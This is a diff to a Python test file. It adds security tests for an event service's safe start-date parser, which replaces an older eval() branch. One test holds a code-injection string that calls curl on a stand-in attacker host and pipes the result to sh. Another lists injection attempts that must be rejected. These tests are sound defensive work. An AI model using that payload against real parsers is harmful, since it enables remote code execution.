@@ -419,6 +419,7 @@ class TestEventTemplateServiceImportEventsTemplate:
         """Test that import_events_template returns a thread."""
         with app.app_context():
             g.jwt_oidc_token_info = TestJwtClaims.staff_admin_role
+            g.token_info = TestJwtClaims.staff_admin_role
 
             # Create a valid mock Excel file
             phases_data = {
@@ -478,6 +479,55 @@ class TestEventTemplateServiceImportEventsTemplate:
             assert isinstance(result, threading.Thread)
             # Wait for thread to complete
             result.join(timeout=5)
+
+
+class TestFindStartAtValueSecurity:
+    """Security tests for the _find_start_at_value safe arithmetic parser.
+
+    Pure-function tests: call the classmethod directly, no DB or Flask context needed.
+    """
+
+    def _svc(self):
+        from api.services.event import EventService
+        return EventService
+
+    def test_plain_integer_accepted(self):
+        """Plain integer strings are valid."""
+        svc = self._svc()
+        assert svc._find_start_at_value("0", 30) == 0
+        assert svc._find_start_at_value("10", 30) == 10
+        assert svc._find_start_at_value("-5", 30) == -5
+
+    def test_number_of_days_alone_accepted(self):
+        """Bare 'number_of_days' is valid and resolves to the supplied value."""
+        assert self._svc()._find_start_at_value("number_of_days", 30) == 30
+
+    def test_number_of_days_plus_offset_accepted(self):
+        """'number_of_days + N' is valid."""
+        assert self._svc()._find_start_at_value("number_of_days + 5", 30) == 35
+
+    def test_number_of_days_minus_offset_accepted(self):
+        """'number_of_days - N' is valid."""
+        assert self._svc()._find_start_at_value("number_of_days - 3", 30) == 27
+
+    def test_malicious_os_import_rejected(self):
+        """Payload designed to exploit the old eval() branch must be rejected."""
+        malicious = "__import__('os').system('curl http://attacker/x|sh') or number_of_days"
+        with pytest.raises(ValueError):
+            self._svc()._find_start_at_value(malicious, 30)
+
+    def test_arbitrary_python_expression_rejected(self):
+        """Any Python expression beyond the allowed forms must be rejected."""
+        svc = self._svc()
+        for bad in [
+            "number_of_days * 2",
+            "number_of_days + 1 + 1",
+            "1 + 1",
+            "number_of_days+0; import os",
+            "eval('1')",
+        ]:
+            with pytest.raises(ValueError, match="Invalid start_at"):
+                svc._find_start_at_value(bad, 30)
 
 
 class TestEventTemplateModel:
